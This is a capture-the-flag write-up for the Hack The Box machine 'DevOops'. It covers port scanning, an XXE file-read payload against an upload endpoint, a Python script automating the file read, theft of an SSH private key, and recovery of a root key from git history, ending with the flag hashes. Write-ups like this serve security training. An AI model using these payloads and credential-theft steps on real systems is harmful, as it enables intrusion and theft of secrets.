+++
title = "HTB - DevOops"
date = 2024-11-28
+++

### Scan
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-28 10:35 EST
Nmap scan report for 10.10.10.91
Host is up (0.097s latency).
Not shown: 65524 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.00 seconds
```

### Enumeration
Webpage with feed.py, TODO referencing dev.solida.fi
`Feroxbuster` to find an upload directory that seems XXE vulnerable
Capture requests with Burp, using the second part of the following format to test injection. Once confirmed, add file read:
```
<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ENTITY test SYSTEM "file:///etc/passwd">]>

<entry>
<Author>&test;
</Author>
<Subject>Testing</Subject>
<Content>Hello</Content>
</entry>
```

We also see `/home/roosa/deploy/src`.

0xdf references making a script to automate this process.

```
#!/usr/bin/python3

import re
import requests
import sys

if len(sys.argv) < 2:
    print(f"usage: {sys.argv[0]} [path to file]")
    sys.exit()

file_name = sys.argv[1]

xml = f'''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM "file://{file_name}">
]>

<item>
<Author>
&bar;
</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</item>'''

files = {'file': ('xxe.xml', xml, 'text/xml')}
proxies = {'http': 'http://127.0.0.1:8080'}
try:
    r = requests.post('http://10.10.10.91:5000/upload', files=files, proxies=proxies)
    if r.status_code == 200:
        pattern = re.compile(r"Author: \n(.*)\n Subject:", flags=re.DOTALL)
        print(re.search(pattern, r.text).group(1).strip())
        sys.exit()
    else:
        pass
except requests.exceptions.ConnectionError:
    pass
print("[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.")
```

We can use the script to see if there are any RSA keys:
`python3 getfile.py /home/roosa/.ssh/id_rsa`

We find roosa's. We can save to a file, change the permissions and SSH into the box:
`ssh -i rsa.key roosa@10.10.10.91`

USER:`3ea932eaf021f7cc8b0180013f75d255`

We root around in roosa's home directory and find .git files. When we go into the workspace, we can use `git status` and find that it's a git repository.

We can check the log with `git log --name-only --oneline`
There's a commit message referencing an incorrect push with a key. The file changed was authcredentials.key
We can view the past history of the file and validate that it is the previous commit version by tagging it and checking the md5sum! This is how we get the proper RSA key.

```
roosa@devoops:~/work/blogfeed$ git log --name-only --oneline
7ff507d Use Base64 for pickle feed loading
src/feed.py
src/index.html
26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
run-gunicorn.sh
src/feed.py
cec54d8 Debug support added to make development more agile.
run-gunicorn.sh
src/feed.py
ca3e768 Blogfeed app, initial version.
src/feed.py
src/index.html
src/upload.html
dfebfdf Gunicorn startup script
run-gunicorn.sh
33e87c3 reverted accidental commit with proper key
resources/integration/authcredentials.key
d387abf add key for feed integration from tnerprise backend
resources/integration/authcredentials.key
1422e5a Initial commit
README.md
roosa@devoops:~/work/blogfeed$ md5sum resources/integration/authcredentials.key 
f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key
roosa@devoops:~/work/blogfeed$ git checkout d387abf -- resources/integration/authcredentials.key
roosa@devoops:~/work/blogfeed$ md5sum resources/integration/authcredentials.key 
d880df0f57e4143a0fcb46fdd76e270b  resources/integration/authcredentials.key
```

ROOT:`48467f7b243d2c614a9daafe012c1861`
